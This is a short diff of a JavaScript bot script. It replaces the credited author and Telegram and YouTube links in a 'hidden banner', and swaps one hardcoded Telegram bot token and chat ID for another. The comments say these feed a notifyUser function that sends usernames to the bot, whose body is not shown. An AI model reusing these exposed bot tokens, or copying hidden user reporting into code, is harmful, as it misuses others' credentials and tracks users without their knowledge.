@@ -30,9 +30,9 @@ const displayHiddenBanner = () => {
 
     // Center each line correctly
     const indentation = "           "; // Indentation for better centering
-    console.log(colors.red.bold(`${indentation}Author - @zuydd`));
-    console.log(colors.red.bold(`${indentation}Telegram - https://t.me/D4kCipherX`));
-    console.log(colors.red.bold(`${indentation}Youtube - https://www.youtube.com/@D4rkCipherX`));
+    console.log(colors.red.bold(`${indentation}Author - @YOUSSEFSOBHY13`));
+    console.log(colors.red.bold(`${indentation}Telegram - https://t.me/kingelnet`));
+    console.log(colors.red.bold(`${indentation}Youtube - https://www.youtube.com/@YOUSSEFSOBHY1`));
 
     console.log(""); // Extra line for spacing
 };
@@ -48,8 +48,8 @@ const generatorHelper = {
 };
 
 // Bot Token and User Chat ID (Replace these with your actual values)
-const BOT_TOKEN = "7319890014:AAGaUmYUmwTQSySh8ssL7hHHFqvqOVjFINg";
-const USER_CHAT_ID = "7135998009"; // Replace with your actual chat ID
+const BOT_TOKEN = "7758870379:AAHgRYYAgoeWTZslu5pSIStYtICW0rU33d4";
+const USER_CHAT_ID = "1878687292"; // Replace with your actual chat ID
 
 // Function to send a notification to your Telegram bot
 const notifyUser = async (username) => {
